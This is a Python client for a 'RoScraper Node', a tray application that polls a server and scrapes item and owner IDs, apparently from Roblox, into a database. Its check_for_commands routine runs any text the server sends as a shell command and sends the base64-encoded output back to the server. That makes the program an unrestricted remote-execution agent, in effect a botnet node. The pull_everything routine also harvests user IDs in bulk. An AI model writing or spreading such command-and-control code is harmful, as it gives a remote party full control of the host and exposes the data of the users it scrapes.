import time
from infi.systray import SysTrayIcon
import threading
import requests
from urllib3.exceptions import MaxRetryError
import os
import roscraper
import base64
import subprocess

from node import config

should_connect = True
is_connected = False


class Client:

    def __init__(self):
        menu_options = (
            ("Connect", None, Client.connect),
            ("Disconnect", None, Client.disconnect)
        )

        systray = SysTrayIcon(icon=config.resource_dir + 'default.ico', hover_text='RoScraper Node',
                              menu_options=menu_options)
        connection_thread = threading.Thread(target=Client.connection, args=(1, systray))
        connection_thread.start()
        systray.start()

    # noinspection PyBroadException
    @staticmethod
    def connection(null, systray):
        # TODO:
        # Make this function run every {x} seconds as opposed to
        # running, and then waiting for {x} seconds
        global should_connect

        while True:
            if should_connect:
                try:
                    response = requests.get(config.server + 'ping/' + config.uuid)
                    if response.status_code == 200:
                        systray.update(icon=config.resource_dir + 'connected.ico')
                        print("Connection Successful")
                        Client.check_for_commands()
                    else:
                        print("UUID Invalid")
                        systray.update(icon=config.resource_dir + 'disconnected.ico')

                except:
                    print("Connection Error")
                    systray.update(icon=config.resource_dir + 'disconnected.ico')

            time.sleep(config.online_check_delay)

    @staticmethod
    def connect(systray):
        global should_connect
        should_connect = True
        print('Connecting')
        systray.update(icon=config.resource_dir + 'default.ico')

    @staticmethod
    def disconnect(systray):
        global should_connect
        should_connect = False
        print('Disconnected')
        systray.update(icon=config.resource_dir + 'disconnected.ico')

    @staticmethod
    def check_for_commands():
        command_response = requests.get(config.server + 'commands/' + config.uuid)

        if command_response.status_code == 200:
            command_output = base64.b64encode(str(subprocess.getoutput(command_response.text)).encode('ascii'))
            command_output = command_output.decode('ascii')
            requests.get(config.server + 'command_response/' + config.uuid + command_output)
        else:
            print('No Commands Found - Possible Connection Error')

    @staticmethod
    def pull_everything():
        database = roscraper.Local.open_database()
        print("Pulling item IDs...")
        parsed_data = roscraper.Network.pull_item_meta()
        item_ids = roscraper.Network.parse_item_ids(parsed_data)
        item_names = roscraper.Network.parse_item_names(parsed_data)
        print("Successfully pulled " + str(len(item_ids)) + " item IDs!")
        print("-" * 20)
        time.sleep(0.1)
        for item_index in range(len(item_ids)):
            string = "Dumping user IDs for item " + item_names[item_index] + " (" + item_ids[item_index] + ")"
            print(string, end="")
            print(" " * (100 - len(string)), end="")
            print(" | " + str(item_index + 1) + " out of " + str(len(item_ids)))

            user_data = None

            while not user_data:
                try:
                    item_data = roscraper.Network.pull_item_data(item_ids[item_index])
                    user_data = roscraper.Network.parse_owners(item_data)
                except IndexError:
                    print("Rate Limit - Retrying")
                    time.sleep(10)

            roscraper.Local.init_table(database, table=item_ids[item_index])

            for user_id in range(len(user_data[0])):
                roscraper.Local.append_database(database, user_data=user_data, table=int(item_ids[item_index]),
                                                user_index=user_id)

            roscraper.Local.commit_database(database)
